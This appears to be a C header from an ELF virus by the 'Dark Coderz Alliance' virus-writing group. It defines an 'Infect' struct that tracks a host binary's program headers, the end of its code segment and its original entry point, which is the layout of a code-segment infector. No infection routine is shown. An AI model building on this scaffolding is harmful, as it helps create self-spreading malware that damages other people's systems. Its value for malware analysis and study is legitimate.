/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/


typedef enum { false , true } bool;

typedef struct 
{
	char src_f[PATH_MAX];     /* source file */
	int fd_f            ;     /* file descriptor */
	int fd_dest         ;     /* file descriptor of destination */
	off_t file_size     ;     /* filesize */
	off_t aligned_fsz   ;     /* aligned file size */
	
	union { void *start ; unsigned char *byte ; Elf32_Ehdr *ehdr; } mmap;
	
	/* pointer to program header (PHDR) */
	Elf32_Phdr *phdr;
	
	/* pointer to first program header phdr[0] 
	 * thats the code segment.              */
	Elf32_Phdr *phdr_code;
	
	/* pointer to program header of type DYNAMIC */
	Elf32_Phdr *phdr_dyn;
	
	/* offset to first byte after the code segment */
	off_t end_of_codes;
	off_t aligned_end_of_codes;
	
	/* here will be jumped to execute the host file: start of host code */
	off_t origin_entry;
	
}Infect; 
		
	
